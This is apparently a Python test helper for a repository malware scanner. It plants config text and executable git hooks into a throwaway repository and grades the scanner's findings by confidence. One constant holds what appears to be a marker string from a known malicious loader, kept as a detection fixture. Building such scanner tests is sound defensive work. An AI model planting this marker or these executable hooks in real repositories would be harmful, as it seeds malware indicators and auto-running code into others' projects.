LOADER = "global['_V'] = '8-st14';\n"
GIT_EXEC = {PAYLOAD_SIGNATURE, SUSPICIOUS_SIGNATURE, RUNS_SIGNATURE}


class ExecSurfaceSandbox(GitSandbox):
    """Build a committed repository, then plant configuration and hooks by writing files, so no
    git command runs after the plant."""

    def repo(self, name: str = "repo") -> Path:
        repo = self.new_repo(name)
        self.write(repo, "README.md", "hello\n")
        self.commit(repo, "init")
        return repo

    def append_config(self, repo: Path, text: str, rel: str = ".git/config") -> None:
        path = repo / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        with open(path, "a", encoding="utf-8") as fh:
            fh.write(text)

    def hook(self, directory: Path, name: str, text: str) -> Path:
        directory.mkdir(parents=True, exist_ok=True)
        path = directory / name
        path.write_text(text, encoding="utf-8")
        path.chmod(path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
        return path

    def scan(self, repo: Path):
        return scan_target(LocalRepoTarget(repo, str(repo), ScanOptions()), load_signatures(), [])

    def graded(self, repo: Path) -> dict[str, list]:
        result = self.scan(repo)
        tiers = {CONFIRMED: [], HEURISTIC: [], INFORMATIONAL: []}
        for f in result.findings + result.informational:
            if f.signature_id in GIT_EXEC:
                tiers[f.confidence].append(f)
        tiers["result"] = result
        return tiers


